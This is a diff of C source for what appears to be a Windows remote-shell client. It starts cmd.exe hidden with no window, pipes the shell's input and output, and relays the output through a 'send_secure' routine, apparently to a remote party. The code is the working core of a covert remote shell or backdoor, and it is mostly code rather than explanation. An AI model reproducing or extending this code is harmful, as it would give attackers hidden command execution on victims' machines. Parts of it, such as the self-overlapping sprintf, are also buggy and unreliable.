@@ -1,5 +1,7 @@
 #include "clientHeader.h"
 #include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
 /*
  * Copyright (C) 2020  @Qu3b411 
  *
@@ -31,7 +33,11 @@
 	 HANDLE hcstdout_rd;	
 	 HANDLE hcstdout_wr;
 	 HANDLE hcstdin_rd;
-	 HANDLE hcstdin_wr		 ;
+	 HANDLE hcstdin_wr;
+	 BYTE* sendBuff = malloc(4096);
+	 ZeroMemory(sendBuff,4096);
+	 BYTE buffer[4096];
+	 DWORD bytesRead=0;
 	 /*
 	  * create an anonomous pipe
 	  */
@@ -44,7 +50,7 @@
 	 {
 	 	return -1;
 	 }
-	 STARTUPINFO si;
+	 STARTUPINFO si = {0};
 	 si.cb = sizeof(STARTUPINFO);
 	 si.hStdError  = hcstdout_wr;
 	 si.hStdOutput = hcstdout_wr;
@@ -52,23 +58,51 @@
 	 si.dwFlags = STARTF_USESTDHANDLES;
 	 si.wShowWindow = SW_HIDE;
 	 PROCESS_INFORMATION pi = {};
-	 BYTE PAYLOAD[] = {"C:\\Windows\\System32\\cmd.exe /K"};
-	 if(!CreateProcessA(NULL,(LPSTR)&PAYLOAD,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si, &pi))
+	 BYTE PAYLOAD[] = {"C:\\Windows\\System32\\cmd.exe"};
+	 if(!CreateProcessA(NULL,PAYLOAD /*"C:\\Windows\\System32\\cmd.exe "*/,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si, &pi))
 	 {
+		 printf("%d",GetLastError());
 		return -1;
 	 }	 
-	 if(!CloseHandle(hcstdout_rd))
+	
+ 	 if(!CloseHandle(hcstdout_wr))
 	 {
 		 return -1;
 	 }
-	 if(!CloseHandle(hcstdin_wr))
-	 {
-		 return -1;
-	 }
-	printf("here");
 
+ 	if(!CloseHandle(hcstdin_rd))
+	 {
+		 return -1;
+	 }
 	 /*
-	BYTE* tmp = "hello";
+	  * CMD initiates with 4 lines,
+	  * 1 the header
+	  * 2 the copyright,
+	  * 3 newline
+	  * 4 prompt
+	  */ 
+	
+		DWORD bw;
+		DWORD tba;
+	do
+	{
+		if(!ReadFile(hcstdout_rd,buffer,4096,&bytesRead,NULL))
+			{
+				printf("read failed: %d", GetLastError());
+				return -1;
+			}
+		if(!PeekNamedPipe(hcstdout_rd,NULL,4096,&bw,&tba,NULL))
+		{
+			printf("here");
+			return -1;
+		}
+	 	sprintf(sendBuff, "%s%s",sendBuff,buffer);
+		
+	} while(bw != 0) ;
+	send_secure(sendBuff,strlen(sendBuff));
+	printf("%s",sendBuff);
+	 /*
+	  * BYTE* tmp = "hello";
 	send_secure(tmp,5);
 	tmp = "world";
 	send_secure(tmp,5);
